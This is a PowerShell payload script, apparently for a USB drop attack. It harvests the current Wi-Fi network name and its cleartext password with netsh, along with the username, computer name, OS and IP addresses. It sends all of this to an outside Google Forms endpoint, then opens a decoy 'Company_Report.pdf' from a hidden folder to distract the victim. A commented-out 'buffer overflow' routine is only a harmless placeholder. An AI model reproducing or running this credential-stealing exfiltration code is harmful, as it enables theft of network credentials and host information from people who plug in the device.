<#
 function Simulate-BufferOverflow {
     Start-Sleep -Seconds 300  # 5 minutes (300 seconds)
     $buffer = New-Object 'System.Collections.ArrayList'     
     $i = 0
     while ($i -lt 1000) {
         $buffer.Add("Overflow data $i")
         $i++
     }
     
     Write-Host "Buffer overflow simulated. Total items in buffer: $($buffer.Count)"
 }
#>




$formURL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSeRatWQklEhGPzyvEsOf4XbWQpW-Dxj2g8nikBbtuE4A-czXg/formResponse"
$entryID = "entry.1276784256"

$wifiName = (netsh wlan show interfaces | Select-String SSID | Select-Object -First 1).ToString().Split(':')[1].Trim()
$wifiPassword = (netsh wlan show profile name="$wifiName" key=clear | Select-String "Key Content")
$wifiPassword = $wifiPassword.ToString().Split(':')[1].Trim()
$logData = @"
-------------------------
USB Drop Attack (Test)
Date: $(Get-Date)
User: $env:USERNAME
PC Name: $env:COMPUTERNAME
OS: $(Get-WmiObject Win32_OperatingSystem).Caption
IP Address: $(Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.InterfaceAlias -notlike '*Loopback*'} | Select-Object -ExpandProperty IPAddress)
WIFI Name: $wifiName
WIFI Password: $wifiPassword
Overflow: Starting in 5mins
-------------------------
"@

$body = @{
    $entryID = $logData
}

$drives = Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Root
foreach ($drive in $drives) {
    $filePath = "$drive\.Trash1000\Company_Report.pdf"


    if (Test-Path $filePath) {
        Start-Process "`"$filePath`""
        
    }
}



Invoke-WebRequest -Uri $formURL -Method Post -Body $body



